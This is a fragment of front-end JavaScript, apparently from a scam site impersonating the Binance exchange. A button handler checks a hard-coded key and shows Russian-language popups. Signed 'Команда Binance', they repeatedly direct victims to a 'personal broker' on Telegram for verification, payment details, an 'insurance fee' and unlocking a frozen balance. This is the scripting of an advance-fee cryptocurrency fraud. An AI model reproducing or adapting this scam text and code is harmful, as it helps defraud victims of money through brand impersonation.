...
btn.onclick = () => {
  ...
  if (usedKey === 'A3F9-7B2E-4C8D-1E6F') {
    popupText.innerHTML = `
      ...
      <p>Для прохождения процедуры верификации, пожалуйста, обратитесь к вашему персональному брокеру <a href="https://t.me/LeslyGomezOficial" target="_blank">@LESLY OLIVIA GOMEZ</a></p>
    ...
    popupText.innerHTML = `
      ...
      <p>Для завершения процедуры и уточнения реквизитов, пожалуйста, обратитесь к вашему персональному брокеру <a href="https://t.me/LeslyGomezOficial" target="_blank">@LESLY OLIVIA GOMEZ</a></p>
      <p>С уважением, <br>Команда Binance</p>
    `
    ...
    popupText.innerHTML = `
      ...
      <p>Для получения реквизитов, пожалуйста, обратитесь к вашему персональному брокеру <a href="https://t.me/LeslyGomezOficial" target="_blank">@LESLY OLIVIA GOMEZ</a></p>
      <p>С уважением, <br>Команда Binance</p>
    `
    ...
    popupText.innerHTML = `
      ...
      <p>Для оплаты страхового взноса, обратитесь за реквизитами к вашему персональному брокеру <a href="https://t.me/LeslyGomezOficial" target="_blank">@LESLY OLIVIA GOMEZ</a></p>
      <p>С уважением, <br>Команда Binance</p>
    `
      ...
      popupText.innerHTML = `
        ...
        <p>Для разблокировки баланса и восстановления доступа, пожалуйста, обратитесь к вашему персональному брокеру <a href="https://t.me/LeslyGomezOficial" target="_blank">@LESLY OLIVIA GOMEZ</a></p>
